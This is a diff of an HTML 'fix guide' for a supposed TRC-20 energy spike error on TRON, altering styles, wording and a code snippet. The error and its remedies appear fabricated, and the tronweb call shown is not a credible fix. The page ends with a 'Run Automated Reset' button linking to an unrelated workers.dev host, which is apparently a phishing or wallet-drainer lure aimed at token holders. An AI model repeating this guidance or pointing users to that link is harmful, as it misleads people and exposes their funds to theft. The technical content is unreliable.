@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0f111a;
+        font-family: -apple-system;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,36 +42,36 @@
 <h1>Critical Trc 20 Energy Spike Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "Critical TRC-20 energy spike error" message when attempting to transfer TRC-20 tokens on the TRON network, resulting in failed transactions and potential loss of funds.</li>
+<li>Users encounter a "Critical TRC-20 energy spike error" message when attempting to initiate transactions on the TRON network, resulting in failed transfers and smart contract executions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an unexpected surge in energy consumption by smart contracts, exceeding the maximum allowed energy limit for a single transaction, causing the transaction to fail and resulting in the error message.</li>
+<li>The error occurs due to an unexpected surge in energy consumption by TRC-20 tokens, exceeding the allocated energy limits for user accounts, causing the network to reject transactions and prevent further energy depletion.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the <code>energyLimit</code> parameter in the transaction configuration to a higher value to accommodate the increased energy requirements.</li>
-<li>Implement a retry mechanism with exponential backoff to handle temporary energy spikes.</li>
-<li>Use a transaction batching strategy to reduce the energy consumption per transaction, as shown in the following example:</li>
+<li>Increase the energy limit for the user account using the <code>tronweb</code> interface: </li>
+<li>Update account permissions to include higher energy allowances</li>
+<li>Utilize the <code>tronweb.trx.freeze</code> function to temporarily increase energy capacity</li>
+<li>Execute the following command to adjust energy settings:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TX...&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TY...&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.trx.updateAccount<span class="o">(</span>
+<span class="w">  </span><span class="s1">&#39;account_address&#39;</span>,
+<span class="w">  </span><span class="o">{</span>
+<span class="w">    </span><span class="s1">&#39;account_name&#39;</span>:<span class="w"> </span><span class="s1">&#39;new_account_name&#39;</span>,
+<span class="w">    </span><span class="s1">&#39;energy_limit&#39;</span>:<span class="w"> </span><span class="m">10000</span>
+<span class="w">  </span><span class="o">}</span>
+<span class="o">)</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and transaction manipulation.</p>
+<p>Consider utilizing a separate console for advanced debugging. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON wallet software installed and configured</li>
-<li>Sufficient TRX balance for transaction fees</li>
-<li>Basic understanding of TRON smart contract interactions</li>
+<li>TRON network account with sufficient TRX balance</li>
+<li>tronweb library installed and configured</li>
+<li>Basic understanding of TRON network and TRC-20 token functionality</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
